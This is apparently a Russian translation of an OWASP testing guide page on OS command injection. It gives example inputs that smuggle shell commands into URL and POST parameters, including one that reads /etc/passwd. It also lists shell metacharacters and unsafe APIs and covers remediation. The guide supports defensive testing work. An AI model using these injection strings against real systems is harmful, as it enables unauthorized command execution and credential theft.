---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование инъекции команд ОС

|ID          |
|------------|
|WSTG-INPV-12|

## Обзор

В этой статье описывается, как протестировать приложение для инъекции команд операционной системы (ОС). Тестировщик попытается ввести команду ОС через HTTP-запрос к приложению.

Инъекции команд ОС — это метод, используемый через web-интерфейс для выполнения команд ОС на web-сервере. Пользователь вводит команды операционной системе через web-интерфейс для их выполнения ОС. Этой уязвимости подвержен любой web-интерфейс, который не нейтрализует ввод должным образом. Имея возможность выполнять команды ОС, пользователь может загружать вредоносные программы или даже получать пароли. Инъекции команд ОС можно предотвратить, если при проектировании и разработке приложений уделять внимание безопасности.

## Задача тестирования

- Найти точки инъекции команд и оценить их последствия.

## Как тестировать

При просмотре файла в web-приложении имя файла часто отображается в URL-адресе. Perl позволяет передавать данные из процесса в операторе open. Пользователь может просто добавить символ конвейера `|` в конец имени файла.

Пример URL до изменения:

`http://sensitive/cgi-bin/userData.pl?doc=user1.txt`

URL после изменения:

`http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|`

Он выполнит команду `/bin/ls`.

Добавление точки с запятой в конец URL страницы .PHP, за которой следует команда операционной системы, приведёт к выполнению этой команды. `%3B` в кодировке URL декодируется в точку с запятой.

Пример:

`http://sensitive/something.php?dir=%3Bcat%20/etc/passwd`

### Пример

Рассмотрим случай приложения, содержащего набор документов, которые вы можете просматривать в Интернете. Если вы запустите HTTP-прокси (например, ZAP или Burp Suite), то сможете увидеть POST-запрос, показанный ниже. (`http://www.example.com/public/doc`):

```http
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf
```

В этом запросе мы замечаем, как приложение извлекает общедоступный документ Doc1.pdf. Теперь мы можем проверить, можно ли добавить команду операционной системы для инъекции в POST-запрос. Попробуйте следующее (`http://www.example.com/public/doc`):

```http
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf+|+Dir c:\
```

Если приложение не проверяет запрос, мы можем получить следующий результат:

```txt
    Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
    Output...
    Il volume nell'unità C non ha etichetta.
    Numero di serie Del volume: 8E3F-4B61
    Directory of c:\
     18/10/2006 00:27 2,675 Dir_Prog.txt
     18/10/2006 00:28 3,887 Dir_ProgFile.txt
     16/11/2006 10:43
        Doc
        11/11/2006 17:25
           Documents and Settings
           25/10/2006 03:11
              I386
              14/11/2006 18:51
             h4ck3r
             30/09/2005 21:40 25,934
            OWASP1.JPG
            03/11/2006 18:29
                Prog
                18/11/2006 11:20
                    Program Files
                    16/11/2006 21:12
                        Software
                        24/10/2006 18:25
                            Setup
                            24/10/2006 23:37
                                Technologies
                                18/11/2006 11:14
                                3 File 32,496 byte
                                13 Directory 6,921,269,248 byte disponibili
                                Return code: 0
```

В данном случае мы успешно провели атаку с инъекцией команд операционной системы.

## Специальные символы для инъекции команд

Для инъекции команд могут использоваться, например, следующие специальные символы `|` `;` `&` `$` `>` `<` `'` `!`:

- `cmd1|cmd2` : использование `|` приведёт к выполнению `cmd2` независимо от того, будет ли выполнение `cmd1` успешным или нет;
- `cmd1;cmd2` : использование `;` заставит выполняться `cmd2` независимо от того, выполнена `cmd1` успешно или нет;
- `cmd1||cmd2` : `cmd2` будет выполнена только в том случае, если выполнение `cmd1` завершится неудачей;
- `cmd1&&cmd2` : `cmd2` будет выполнена только в том случае, если выполнение `cmd1` завершится успешно;
- `$(cmd)` : например, `echo $(whoami)` или `$(touch test.sh; echo 'ls' > test.sh)`;
- `cmd` : используется для выполнения определённой команды. Например, `whoami`
- `>(cmd)`: `>(ls)`
- `<(cmd)`: `<(ls)`

## Анализ кода в небезопасных API

Помните об использовании следующих API, так как это может привести к риску инъекций команд ОС.

### Java

- `Runtime.exec()`

### C/C++

- `system`
- `exec`
- `ShellExecute`

### Python

- `exec`
- `eval`
- `os.system`
- `os.popen`
- `subprocess.popen`
- `subprocess.call`

### PHP

- `system`
- `shell_exec`
- `exec`
- `proc_open`
- `eval`

## Как исправить

### Нейтрализация

URL и данные http-форм необходимо нейтрализовывать от недопустимых символов. Как вариант - список запрещённых символов, но заранее трудно предугадать все возможные символы для контроля. Также могут появляться какие-то символы, которые ещё не обнаружены. Для контроля пользовательского ввода следует создать список разрешённых символов, содержащий только допустимые, или список команд. Пропущенные символы, а также необнаруженные угрозы должны быть исключены из этого списка.

Общий список запрещённых символов, который должен быть включен для предотвращения инъекции команд ОС, может быть таким: `|` `;` `&` `$` `>` `<` `'` `\` `!` `>>` `#`

Экранируйте или фильтруйте следующие специальные символы для Windows:   `(` `)` `<` `>` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `^` `~` `!` `.` `"` `%` `@` `/` `\` `:` `+` `,`  ``` ` ```
Экранируйте или фильтруйте следующие специальные символы для Linux, `{` `}` `(` `)` `>` `<` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `$` `–` `#` `~` `!` `.` `"` `%`  `/` `\` `:` `+` `,` ``` ` ```

### Разрешения

Web-приложение и его компоненты должны работать со строгими ограничениями прав, не позволяющими выполнять команды операционной системы. Попробуйте проверить всю эту информацию, чтобы протестировать её с точки зрения серого ящика.

## Инструменты

- OWASP [WebGoat](https://owasp.org/www-project-webgoat/)
- [Commix](https://github.com/commixproject/commix)

## Ссылки

- [Penetration Testing for Web Applications (Part Two)](https://www.symantec.com/connect/articles/penetration-testing-web-applications-part-two)
- [OS Commanding](http://projects.webappsec.org/w/page/13246950/OS%20Commanding)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
- [ENV33-C. Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)